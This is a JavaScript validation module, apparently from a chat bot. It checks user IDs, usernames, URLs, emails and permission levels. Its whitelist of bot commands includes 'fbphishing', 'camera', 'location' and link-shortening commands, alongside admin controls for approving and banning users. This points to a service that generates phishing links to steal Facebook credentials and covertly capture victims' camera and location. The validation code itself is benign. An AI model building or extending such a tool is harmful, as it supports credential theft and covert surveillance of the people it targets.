class Validator {
    
    validateUserId(userId) {
        return userId && !isNaN(userId) && userId > 0;
    }

    validateUsername(username) {
        if (!username) return false;
        const usernameRegex = /^[a-zA-Z0-9_]{5,32}$/;
        return usernameRegex.test(username.replace('@', ''));
    }

    validateUrl(url) {
        try {
            new URL(url);
            return true;
        } catch {
            return false;
        }
    }

    validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    validateCommand(command) {
        const allowedCommands = [
            'start', 'fbphishing', 'camera', 'location', 'info', 
            'all', 'custom', 'shorten', 'mylinks', 'help',
            'users', 'userinfo', 'approve', 'reject', 'ban', 
            'unban', 'pending', 'broadcast', 'stats', 'logs', 
            'clearlogs', 'backup'
        ];
        return allowedCommands.includes(command);
    }

    validatePageNumber(page) {
        const num = parseInt(page);
        return !isNaN(num) && num > 0;
    }

    validateDateFormat(date) {
        const dateRegex = /^\d{4}-\d{2}-\d{2}$/;
        return dateRegex.test(date);
    }

    sanitizeInput(input) {
        if (typeof input !== 'string') return input;
        return input
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;')
            .trim();
    }

    validatePermission(level, requiredLevel) {
        const levels = {
            'user': 1,
            'approved': 2,
            'admin': 3,
            'super_admin': 4
        };
        return levels[level] >= levels[requiredLevel];
    }
}

module.exports = new Validator();